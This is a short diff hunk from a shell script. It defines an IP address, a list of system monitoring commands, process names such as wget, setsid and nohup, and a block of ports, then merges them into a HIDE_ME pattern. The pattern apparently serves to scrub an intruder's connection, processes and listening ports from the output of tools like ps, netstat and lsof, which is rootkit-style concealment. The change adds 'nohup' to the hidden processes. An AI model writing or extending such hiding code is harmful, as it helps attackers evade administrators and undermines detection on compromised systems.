@@ -13,7 +13,7 @@ get_timestamp () {
 IP="10.10.2.4"
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
 COMMANDS="ps top ss netstat lsof who w last cat ls grep egrep"
-PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|setsid|wget|flock"
+PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
 PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60000|60001|60002|60003|60004|60005|60006|60007|60008|60009"
 HIDE_ME="$IP_ESCAPED|$PROCESSES|$PORTS"
 
